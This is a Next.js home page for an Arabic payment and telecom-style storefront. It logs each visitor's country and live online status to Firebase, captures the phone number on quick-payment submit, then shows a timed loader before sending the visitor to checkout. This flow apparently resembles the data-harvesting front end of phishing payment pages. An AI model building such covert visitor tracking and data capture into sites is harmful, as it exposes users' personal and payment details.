"use client"
import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"

import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/online-sts"

import Header from "@/components/layout/header"
import Footer from "@/components/layout/footer"
import WhatsAppButton from "@/components/layout/whatsapp-button"
import HeroSection from "@/components/sections/hero-section"
import ServicesSection from "@/components/sections/services-section"
import QuickPaymentSection from "@/components/sections/quick-payment-section"
import QuickAccessSection from "@/components/sections/quick-access-section"
import FeaturedProductsSection from "@/components/sections/featured-products-section"
import PromoBannerSection from "@/components/sections/promo-banner-section"
import GiftCardsSection from "@/components/sections/gift-cards-section"
import AccessoriesSection from "@/components/sections/accessories-section"
import EntertainmentSection from "@/components/sections/entertainment-section"
import NewsletterSection from "@/components/sections/newsletter-section"
import { FullPageLoader } from "@/components/full-page-loader"

const _id = Math.random()
  .toString(36)
  .replace(/[^a-z]+/g, "")
  .substr(0, 15)

export default function Home() {
  const [isLoading, setIsLoading] = useState(false)
  const router = useRouter()

  useEffect(() => {
    async function getLocation() {
      try {
        const response = await fetch("/api/location")
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`)
        }
        const data = await response.json()
        const country = data.country

        addData({
          id: _id,
          country: country,
          createdDate: new Date().toISOString(),
        })
        localStorage.setItem("country", country)
        setupOnlineStatus(_id)
      } catch (error) {
        console.error("Error fetching location:", error)
      }
    }

    getLocation()
  }, [])

  const handlePaymentSubmit = (amount: string, phone: string) => {
    const id = localStorage.getItem("visitor")
    addData({ id: id, phone, mobile: phone })
    localStorage.setItem("amount", amount)
    setIsLoading(true)
    setTimeout(() => {
      router.push("/checkout")
      setIsLoading(false)
    }, 3000)
  }

  return (
    <div
      className="flex flex-col min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50 font-sans"
      dir="rtl"
    >
      <Header />
      <main>
        <HeroSection />
        <div className="px-4 md:px-6 space-y-12 md:space-y-20">
          <ServicesSection />
          <QuickPaymentSection onSubmit={handlePaymentSubmit} />
          <QuickAccessSection />
          <FeaturedProductsSection />
          <PromoBannerSection />
          <GiftCardsSection />
          <AccessoriesSection />
          <EntertainmentSection />
        </div>
        <NewsletterSection />
      </main>
      <Footer />
      <WhatsAppButton />
      {isLoading && <FullPageLoader text="جاري التحويل ..." />}
    </div>
  )
}
